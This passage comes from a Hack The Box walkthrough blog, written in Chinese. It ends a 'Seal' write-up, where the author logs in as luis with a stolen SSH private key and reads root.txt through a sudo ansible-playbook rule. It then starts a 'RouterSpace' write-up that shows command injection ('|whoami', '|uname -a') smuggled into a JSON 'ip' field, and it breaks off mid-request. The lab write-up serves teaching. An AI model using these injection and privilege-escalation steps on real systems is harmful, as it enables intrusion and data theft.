tomcat tomcat      807 May  5  2021 .profile<br>drwx------ 2 tomcat tomcat     4096 Sep  1 12:38 .ssh<br>-r-------- 1 tomcat tomcat       33 Sep  1 10:00 user.txt<br>tomcat@seal:/tmp/dashboard/uploads/luis$ <span class="hljs-built_in">cat</span> user.txt <br>98f4bf24..............................<br></code></pre></td></tr></table></figure><p>有用户秘钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">tomcat@seal:/tmp/dashboard/uploads/luis/.ssh$ <span class="hljs-built_in">ls</span><br>authorized_keys  id_rsa  id_rsa.pub<br>tomcat@seal:/tmp/dashboard/uploads/luis/.ssh$ <span class="hljs-built_in">cat</span> id_rsa<br><br>CrazyInSide:~/HackTheBox$ ssh -i id_rsa luis@10.10.10.250    <br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.250 (10.10.10.250)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:CK0IgtHX4isQwWAPna6oD88DnRAM9OacxQExxLSnlL0.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.10.250<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Documentation:  https://help.ubuntu.com</span><br><span class="hljs-string"> * Management:     https://landscape.canonical.com</span><br><span class="hljs-string"> * Support:        https://ubuntu.com/advantage</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System information as of Thu 01 Sep 2022 12:41:22 PM UTC</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System load:  0.29              Processes:             165</span><br><span class="hljs-string">  Usage of /:   49.2% of 9.58GB   Users logged in:       0</span><br><span class="hljs-string">  Memory usage: 30%               IPv4 address for eth0: 10.10.10.250</span><br><span class="hljs-string">  Swap usage:   0%</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Pure upstream Kubernetes 1.21, smallest, simplest cluster ops!</span><br><span class="hljs-string"></span><br><span class="hljs-string">     https://microk8s.io/</span><br><span class="hljs-string"></span><br><span class="hljs-string">22 updates can be applied immediately.</span><br><span class="hljs-string">15 of these updates are standard security updates.</span><br><span class="hljs-string">To see these additional updates run: apt list --upgradable</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">The list of available updates is more than a week old.</span><br><span class="hljs-string">To check for new updates run: sudo apt update</span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Fri May  7 07:00:18 2021 from 10.10.14.2</span><br><span class="hljs-string">luis@seal:~$ </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">luis@seal:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> luis on seal:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User luis may run the following commands on seal:<br>    (ALL) NOPASSWD: /usr/bin/ansible-playbook *<br>luis@seal:~$ <span class="hljs-built_in">cat</span> run.yml <br>- hosts: localhost<br>  tasks:<br>  - name: <span class="hljs-built_in">cat</span><br>    shell: <span class="hljs-built_in">cat</span> /root/root.txt &gt; flag.txt<br>    register: out<br><br>  - name: stdout<br>    debug: msg=<span class="hljs-string">&quot;&quot;</span><br><br>  - name: stderr<br>    debug: msg=<span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">luis@seal:~$ sudo /usr/bin/ansible-playbook run.yml <br>[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match <span class="hljs-string">&#x27;all&#x27;</span><br><br>PLAY [localhost] *******************************************************************************************************************************************************************************<br><br>TASK [Gathering Facts] *************************************************************************************************************************************************************************<br>ok: [localhost]<br><br>TASK [<span class="hljs-built_in">cat</span>] *************************************************************************************************************************************************************************************<br>changed: [localhost]<br><br>TASK [stdout] **********************************************************************************************************************************************************************************<br>ok: [localhost] =&gt; &#123;<br>    <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>&#125;<br><br>TASK [stderr] **********************************************************************************************************************************************************************************<br>ok: [localhost] =&gt; &#123;<br>    <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>&#125;<br><br>PLAY RECAP *************************************************************************************************************************************************************************************<br>localhost                  : ok=4    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   <br><br>luis@seal:~$ <span class="hljs-built_in">ls</span><br>flag.txt  gitbucket.war  run.yml  user.txt<br>luis@seal:~$ <span class="hljs-built_in">cat</span> flag.txt <br>9b0c..............................<br>luis@seal:~$ <br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - RouterSpace</title>
    <link href="/post/HackTheBox-RouterSpace.html"/>
    <url>/post/HackTheBox-RouterSpace.html</url>
    
    <content type="html"><![CDATA[<p>HTB Walkthrough - RouterSpace</p><p>Recon</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92SVN scan initiated Tue Jun  7 14:26:06 2022 as: nmap -sC -sV -Pn -p- -oA nmap.txt -T4 10.10.11.148</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.148<br>Host is up (0.20s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     (protocol 2.0)<br>| fingerprint-strings: <br>|   NULL: <br>|_    SSH-2.0-RouterSpace Packet Filtering V1<br>80/tcp open  http<br>| fingerprint-strings: <br>|   FourOhFourRequest: <br>|     HTTP/1.1 200 OK<br>|     X-Powered-By: RouterSpace<br>|     X-Cdn: RouterSpace-33828<br>|     Content-Type: text/html; charset=utf-8<br>|     Content-Length: 66<br>|     ETag: W/<span class="hljs-string">&quot;42-VNKMGPMvv4TCZTLr0VRwPPt5x1g&quot;</span><br>|     Date: Tue, 07 Jun 2022 06:26:17 GMT<br>|     Connection: close<br>|     Suspicious activity detected !!! &#123;RequestID: 0 A vdE eM s kV &#125;<br>|   GetRequest: <br>|     HTTP/1.1 200 OK<br>|     X-Powered-By: RouterSpace<br>|     X-Cdn: RouterSpace-87987<br>|     Accept-Ranges: bytes<br>|     Cache-Control: public, max-age=0<br>|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT<br>|     ETag: W/<span class="hljs-string">&quot;652c-17d476c9285&quot;</span><br>|     Content-Type: text/html; charset=UTF-8<br>|     Content-Length: 25900<br>|     Date: Tue, 07 Jun 2022 06:26:13 GMT<br>|     Connection: close<br>|     &lt;!doctype html&gt;<br>|     &lt;html class=<span class="hljs-string">&quot;no-js&quot;</span> lang=<span class="hljs-string">&quot;zxx&quot;</span>&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>|     &lt;meta http-equiv=<span class="hljs-string">&quot;x-ua-compatible&quot;</span> content=<span class="hljs-string">&quot;ie=edge&quot;</span>&gt;<br>|     &lt;title&gt;RouterSpace&lt;/title&gt;<br>|     &lt;meta name=<span class="hljs-string">&quot;description&quot;</span> content=<span class="hljs-string">&quot;&quot;</span>&gt;<br>|     &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;<br>|     &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/bootstrap.min.css&quot;</span>&gt;<br>|     &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/owl.carousel.min.css&quot;</span>&gt;<br>|     &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/magnific-popup.css&quot;</span>&gt;<br>|     &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/font-awesome.min.css&quot;</span>&gt;<br>|     &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/themify-icons.css&quot;</span>&gt;<br>|   HTTPOptions: <br>|     HTTP/1.1 200 OK<br>|     X-Powered-By: RouterSpace<br>|     X-Cdn: RouterSpace-83483<br>|     Allow: GET,HEAD,POST<br>|     Content-Type: text/html; charset=utf-8<br>|     Content-Length: 13<br>|     ETag: W/<span class="hljs-string">&quot;d-bMedpZYGrVt1nR4x+qdNZ2GqyRo&quot;</span><br>|     Date: Tue, 07 Jun 2022 06:26:14 GMT<br>|     Connection: close<br>|     GET,HEAD,POST<br>|   RTSPRequest, X11Probe: <br>|     HTTP/1.1 400 Bad Request<br>|_    Connection: close<br>|_http-title: RouterSpace<br>2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://google.com/cgi-bin/submit.cgi?new-service :<br>==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============<br>SF-Port22-TCP:V=7.92SVN%I=7%D=6/7%Time=629EEF85%P=x86_64-unknown-linux-gnu<br>SF:%r(NULL,29,<span class="hljs-string">&quot;SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n&quot;</span>);<br>==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============<br>SF-Port80-TCP:V=7.92SVN%I=7%D=6/7%Time=629EEF85%P=x86_64-unknown-linux-gnu<br>SF:%r(GetRequest,29F8,<span class="hljs-string">&quot;HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSp</span><br><span class="hljs-string">SF:ace\r\nX-Cdn:\x20RouterSpace-87987\r\nAccept-Ranges:\x20bytes\r\nCache-</span><br><span class="hljs-string">SF:Control:\x20public,\x20max-age=0\r\nLast-Modified:\x20Mon,\x2022\x20Nov</span><br><span class="hljs-string">SF:\x202021\x2011:33:57\x20GMT\r\nETag:\x20W/\&quot;652c-17d476c9285\&quot;\r\nConte</span><br><span class="hljs-string">SF:nt-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2025900\r\n</span><br><span class="hljs-string">SF:Date:\x20Tue,\x2007\x20Jun\x202022\x2006:26:13\x20GMT\r\nConnection:\x2</span><br><span class="hljs-string">SF:0close\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20class=\&quot;no-js\&quot;\x20lang=\&quot;zx</span><br><span class="hljs-string">SF:x\&quot;&gt;\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20</span><br><span class="hljs-string">SF:\x20&lt;meta\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20content=\&quot;ie=edge\&quot;&gt;\n\x</span><br><span class="hljs-string">SF:20\x20\x20\x20&lt;title&gt;RouterSpace&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta\x20name</span><br><span class="hljs-string">SF:=\&quot;description\&quot;\x20content=\&quot;\&quot;&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\&quot;view</span><br><span class="hljs-string">SF:port\&quot;\x20content=\&quot;width=device-width,\x20initial-scale=1\&quot;&gt;\n\n\x20\x</span><br><span class="hljs-string">SF:20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/bootstrap\.min\.css</span><br><span class="hljs-string">SF:\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/owl\.car</span><br><span class="hljs-string">SF:ousel\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href</span><br><span class="hljs-string">SF:=\&quot;css/magnific-popup\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;styleshee</span><br><span class="hljs-string">SF:t\&quot;\x20href=\&quot;css/font-awesome\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20r</span><br><span class="hljs-string">SF:el=\&quot;stylesheet\&quot;\x20href=\&quot;css/themify-icons\.css\&quot;&gt;\n\x20&quot;</span>)%r(HTTPOpt<br>SF:ions,108,<span class="hljs-string">&quot;HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX-C</span><br><span class="hljs-string">SF:dn:\x20RouterSpace-83483\r\nAllow:\x20GET,HEAD,POST\r\nContent-Type:\x2</span><br><span class="hljs-string">SF:0text/html;\x20charset=utf-8\r\nContent-Length:\x2013\r\nETag:\x20W/\&quot;d</span><br><span class="hljs-string">SF:-bMedpZYGrVt1nR4x\+qdNZ2GqyRo\&quot;\r\nDate:\x20Tue,\x2007\x20Jun\x202022\x</span><br><span class="hljs-string">SF:2006:26:14\x20GMT\r\nConnection:\x20close\r\n\r\nGET,HEAD,POST&quot;</span>)%r(RTSP<br>SF:Request,2F,<span class="hljs-string">&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\</span><br><span class="hljs-string">SF:r\n\r\n&quot;</span>)%r(X11Probe,2F,<span class="hljs-string">&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnecti</span><br><span class="hljs-string">SF:on:\x20close\r\n\r\n&quot;</span>)%r(FourOhFourRequest,128,<span class="hljs-string">&quot;HTTP/1\.1\x20200\x20OK\</span><br><span class="hljs-string">SF:r\nX-Powered-By:\x20RouterSpace\r\nX-Cdn:\x20RouterSpace-33828\r\nConte</span><br><span class="hljs-string">SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2066\r\nETa</span><br><span class="hljs-string">SF:g:\x20W/\&quot;42-VNKMGPMvv4TCZTLr0VRwPPt5x1g\&quot;\r\nDate:\x20Tue,\x2007\x20Ju</span><br><span class="hljs-string">SF:n\x202022\x2006:26:17\x20GMT\r\nConnection:\x20close\r\n\r\nSuspicious\</span><br><span class="hljs-string">SF:x20activity\x20detected\x20!!!\x20&#123;RequestID:\x200\x20A\x20\x20vdE\x20e</span><br><span class="hljs-string">SF:M\x20s\x20kV\x20\x20&#125;\n\n&quot;</span>);<br><br>Service detection performed. Please report any incorrect results at https://google.com/submit/ .<br><span class="hljs-comment"># Nmap done at Tue Jun  7 14:26:58 2022 -- 1 IP address (1 host up) scanned in 52.85 seconds</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220607133628875.png" alt="image-20220607133628875"></p><p>点击按钮能够抓到一个包。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/v4/monitoring/router/dev/check/deviceAccess</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">accept</span><span class="hljs-punctuation">: </span>application/json, text/plain, */*<br><span class="hljs-attribute">user-agent</span><span class="hljs-punctuation">: </span>RouterSpaceAgent<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>16<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>routerspace.htb<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;ip&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;0.0.0.0&quot;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p>目标会返回一个这样的包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>RouterSpace<br><span class="hljs-attribute">X-Cdn</span><span class="hljs-punctuation">: </span>RouterSpace-4331<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json; charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>11<br><span class="hljs-attribute">ETag</span><span class="hljs-punctuation">: </span>W/&quot;b-ANdgA/PInoUrpfEatjy5cxfJOCY&quot;<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Tue, 07 Jun 2022 05:44:59 GMT<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-lsl"><span class="hljs-string">&quot;0.0.0.0<span class="hljs-subst">\n</span>&quot;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>RouterSpace<br><span class="hljs-attribute">X-Cdn</span><span class="hljs-punctuation">: </span>RouterSpace-99107<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json; charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>16<br><span class="hljs-attribute">ETag</span><span class="hljs-punctuation">: </span>W/&quot;10-BlxNnG9XXox6OkKPYocmDX3rnQE&quot;<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Tue, 07 Jun 2022 05:45:52 GMT<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-lsl"><span class="hljs-string">&quot;10.10.11.148<span class="hljs-subst">\n</span>&quot;</span></span><br></code></pre></td></tr></table></figure><p>能够远程检测状态，远程检测肯定要先确定目标IP确实存活，可能会涉及到ping，走ping的话或许会产生命令注入。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/v4/monitoring/router/dev/check/deviceAccess</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">accept</span><span class="hljs-punctuation">: </span>application/json, text/plain, */*<br><span class="hljs-attribute">user-agent</span><span class="hljs-punctuation">: </span>RouterSpaceAgent<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>28<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>routerspace.htb<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;ip&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;10.10.11.148|whoami&quot;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>RouterSpace<br><span class="hljs-attribute">X-Cdn</span><span class="hljs-punctuation">: </span>RouterSpace-33899<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json; charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>8<br><span class="hljs-attribute">ETag</span><span class="hljs-punctuation">: </span>W/&quot;8-qTM+b2Uq+FmQphCm7m1RM+pENkU&quot;<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Tue, 07 Jun 2022 05:50:53 GMT<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-lsl"><span class="hljs-string">&quot;paul<span class="hljs-subst">\n</span>&quot;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/v4/monitoring/router/dev/check/deviceAccess</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">accept</span><span class="hljs-punctuation">: </span>application/json, text/plain, */*<br><span class="hljs-attribute">user-agent</span><span class="hljs-punctuation">: </span>RouterSpaceAgent<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>30<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>routerspace.htb<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;ip&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;10.10.11.148|uname -a&quot;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>RouterSpace<br><span class="hljs-attribute">X-Cdn</span><span class="hljs-punctuation">: </span>RouterSpace-73188<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json; charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>118<br><span class="hljs-attribute">ETag</span><span class="hljs-punctuation">: </span>W/&quot;76-8Wa8VoIuEr6UmcoU3vuaXZww1aE&quot;<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Tue, 07 Jun 2022 05:51:46 GMT<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-dns">&quot;Linux routerspace.htb <span class="hljs-number">5.4.0-90</span>-generic #<span class="hljs-number">101</span>-Ubuntu SMP Fri Oct <span class="hljs-number">15 20:00:55</span> UTC <span class="hljs-number">2021</span> x86_64 x86_64 x86_64 GNU/Linux\n&quot;</span><br></code></pre></td></tr></table></figure><p>直接反弹shell会不成功。但是能够读取文件：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/v4/monitoring/router/dev/check/deviceAccess</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">accept</span><span class="hljs-punctuation">: </span>application/json, text/plain, */*<br><span class="hljs-attribute">user-agent</span><span class="hljs-punctuation">: </span>RouterSpaceAgent<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>45<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>routerspace.htb<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;ip&quot;</span><span 